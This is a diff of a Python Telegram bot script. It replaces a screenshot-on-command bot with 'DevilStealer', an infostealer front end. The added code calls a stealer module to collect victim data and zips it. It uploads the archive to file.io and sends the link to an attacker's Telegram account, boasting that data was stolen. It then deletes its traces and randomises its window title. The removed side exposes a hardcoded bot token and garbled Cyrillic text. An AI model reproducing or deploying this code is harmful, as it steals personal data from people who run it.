@@ -1,59 +1,43 @@
 import os
-import time
 import telebot
-import pyautogui
-import keyboard
+import requests
+import stealer
+from telebot import types
+import string
+import random
 
-BOT_TOKEN = "7924904605:AAGesbGMOTbGtyoD4JdBArrffGpHsubPq84"
-YOUR_TELEGRAM_ID = 5622791576
-SCREENSHOT_PATH = "screenshot.png"
+ADMIN_ID = "ID" # Your telegram id
+FILE_IO_API_URL = "https://file.io"
 
-bot = telebot.TeleBot(BOT_TOKEN)
+bot = telebot.TeleBot("TOKEN") # Your bot token
 
-def is_authorized(user_id):
-    return user_id == YOUR_TELEGRAM_ID
+rand_title = ''.join(random.choice(string.ascii_lowercase) for i in range(10))
+os.system(f"title {rand_title}")
 
-@bot.message_handler(commands=['start'])
-def send_welcome(message):
-    if is_authorized(message.from_user.id):
-        bot.reply_to(message, "������! ������� /photo, ����� �������� �������� � �������� ��������.")
-    else:
-        bot.reply_to(message, "? � ���� ��� �������.")
+def upload_to_fileio(archive_path):
+    with open(archive_path, "rb") as file:
+        response = requests.post(FILE_IO_API_URL, files={"file": file})
+        response_data = response.json()
+        file.close()
+        return response_data.get("link")
 
-@bot.message_handler(commands=['photo'])
-def handle_photo(message):
-    user_id = message.from_user.id
+def send_to_tg(archive_path):
+    file_io_link = upload_to_fileio(archive_path)
+    lnkkb = types.InlineKeyboardMarkup()
+    btn = types.InlineKeyboardButton(text="😈 Скачать логи", url=file_io_link)
+    lnkkb.add(btn)
+    bot.send_message(ADMIN_ID, f"DevilStealer>>> АХХАХХАХ кто-то попался\nДанные были успешно украденны 😈!\nСкачайте логи по кнопке ниже", reply_markup=lnkkb)
 
-    if not is_authorized(user_id):
-        bot.reply_to(message, "? ������ ��������.")
-        return
 
-    bot.reply_to(message, "?? �������� ������� /photo. ������� F5...")
-
-    try:
-        keyboard.press_and_release('f5')
-        bot.send_message(user_id, "? F5 �����. ��� �������� ��������...")
-
-        time.sleep(3)
-
-        screenshot = pyautogui.screenshot()
-        screenshot.save(SCREENSHOT_PATH)
-
-        # ���������� ����
-        with open(SCREENSHOT_PATH, 'rb') as photo:
-            bot.send_photo(user_id, photo)
-
-        bot.send_message(user_id, "?? �������� ���������!")
-
-    except Exception as e:
-        error_msg = f"? ������: {str(e)}"
-        bot.send_message(user_id, error_msg)
-        print(error_msg)
-    finally:
-        if os.path.exists(SCREENSHOT_PATH):
-            os.remove(SCREENSHOT_PATH)
+def main():
+    stealer.steal_all()
+    arch = stealer.create_zip_archive()
+    if arch:
+        send_to_tg(stealer.ZIP_PATH)
+        stealer.delFolder()
+        bot.stop_polling()
+        exit(0)
 
 if __name__ == "__main__":
-    print("? ��� �������. �������� ������� /photo...")
-    print(f"���� Telegram ID: {YOUR_TELEGRAM_ID}")
-    bot.infinity_polling()
+    main()
+    bot.polling(none_stop=True)
